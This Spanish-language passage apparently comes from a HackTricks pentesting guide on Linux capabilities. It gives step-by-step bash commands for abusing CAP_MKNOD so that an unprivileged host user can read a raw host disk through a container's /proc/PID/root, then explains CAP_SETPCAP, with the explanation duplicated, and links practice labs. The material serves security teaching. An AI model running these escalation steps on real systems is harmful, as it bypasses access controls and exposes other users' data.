1. Tener acceso inicial al host (Unprivileged).
2. Tener acceso inicial al container (Privileged (EUID 0), y `CAP_MKNOD` efectiva).
3. El host y el container deben compartir el mismo user namespace.

**Pasos para crear y acceder a un dispositivo de bloques en un container:**

1. **En el host como un usuario estándar:**

- Determina tu ID de usuario actual con `id`, por ejemplo, `uid=1000(standarduser)`.
- Identifica el dispositivo objetivo, por ejemplo, `/dev/sdb`.

2. **Dentro del container como `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **De vuelta en el Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Este enfoque permite al usuario estándar acceder y potencialmente leer datos de `/dev/sdb` a través del container, aprovechando los user namespaces compartidos y los permisos establecidos en el dispositivo.

### CAP_SETPCAP

**CAP_SETPCAP** permite a un proceso **alterar los capability sets** de otro proceso, lo que permite añadir o eliminar capabilities de los conjuntos effective, inheritable y permitted. Sin embargo, un proceso solo puede modificar capabilities que posea en su propio conjunto permitted, lo que garantiza que no pueda elevar los privilegios de otro proceso más allá de los suyos. Las actualizaciones recientes del kernel han endurecido estas reglas, restringiendo `CAP_SETPCAP` a únicamente reducir las capabilities dentro de sus propios conjuntos permitted o los de sus descendientes, con el objetivo de mitigar riesgos de seguridad. Su uso requiere tener `CAP_SETPCAP` en el conjunto effective y las capabilities objetivo en el conjunto permitted, utilizando `capset()` para realizar las modificaciones. Esto resume la función principal y las limitaciones de `CAP_SETPCAP`, destacando su papel en la gestión de privilegios y la mejora de la seguridad.

**`CAP_SETPCAP`** es una Linux capability que permite a un proceso **modificar los capability sets de otro proceso**. Concede la capacidad de añadir o eliminar capabilities de los conjuntos effective, inheritable y permitted de otros procesos. Sin embargo, existen ciertas restricciones sobre cómo puede utilizarse esta capability.

Un proceso con `CAP_SETPCAP` **solo puede conceder o eliminar capabilities que estén en su propio conjunto permitted**. En otras palabras, un proceso no puede conceder una capability a otro proceso si no posee dicha capability. Esta restricción impide que un proceso eleve los privilegios de otro proceso más allá de su propio nivel de privilegios.

Además, en las versiones recientes del kernel, la capability `CAP_SETPCAP` ha sido **restringida aún más**. Ya no permite que un proceso modifique arbitrariamente los capability sets de otros procesos. En su lugar, **solo permite que un proceso reduzca las capabilities de su propio conjunto permitted o del conjunto permitted de sus descendientes**. Este cambio se introdujo para reducir los posibles riesgos de seguridad asociados con esta capability.

Para utilizar `CAP_SETPCAP` de forma efectiva, es necesario tener la capability en el conjunto effective y las capabilities objetivo en el conjunto permitted. Después, se puede utilizar la system call `capset()` para modificar los capability sets de otros procesos.

En resumen, `CAP_SETPCAP` permite a un proceso modificar los capability sets de otros procesos, pero no puede conceder capabilities que no posea. Además, debido a problemas de seguridad, su funcionalidad se ha limitado en las versiones recientes del kernel a permitir únicamente la reducción de capabilities en su propio conjunto permitted o en los conjuntos permitted de sus descendientes.

## Referencias

**La mayoría de estos ejemplos se tomaron de algunos labs de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), por lo que, si quieres practicar estas técnicas de privesc, recomiendo estos labs.

**Otras referencias**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
